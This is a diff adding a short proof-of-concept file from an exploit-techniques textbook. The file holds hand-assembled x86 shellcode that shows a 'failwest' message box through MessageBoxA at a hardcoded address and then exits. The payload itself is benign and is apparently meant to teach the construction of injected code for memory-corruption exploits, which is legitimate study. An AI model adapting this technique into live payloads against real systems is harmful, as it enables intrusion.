@@ -1,0 +1,31 @@
+/*****************************************************************************
+      To be the apostrophe which changed "Impossible" into "I'm possible"!
+		
+POC code of chapter 3.2 in book "Vulnerability Exploit and Analysis Technique"
+ 
+file name	: machine_code.txt
+author		: failwest  
+date		: 2006.10.20
+description	: binary code which extracted from PE file   
+Noticed		: 
+version		: 1.0
+E-mail		: failwest@gmail.com
+		
+	Only for educational purposes    enjoy the fun from exploiting :)
+******************************************************************************/
+
+"\x66\x81\xEC\x40\x04"   SUB SP,440
+"\x33\xDB"           XOR EBX,EBX
+"\x53"             PUSH EBX
+"\x68\x77\x65\x73\x74"     PUSH 74736577
+"\x68\x66\x61\x69\x6C"     PUSH 6C696166
+"\x8B\xC4"           MOV EAX,ESP
+"\x53"             PUSH EBX
+"\x50"             PUSH EAX
+"\x50"             PUSH EAX
+"\x53"             PUSH EBX
+"\xB8\xEA\x04\xD8\x77"     MOV EAX,user32.MessageBoxA
+"\xFF\xD0"           CALL EAX
+"\x53"             PUSH EBX        ; /ExitCode
+"\xB8\xDA\xCD\x81\x7C"     MOV EAX,kernel32.ExitProcess   
+"\xFF\xD0"           CALL EAX      ; \ExitProcess
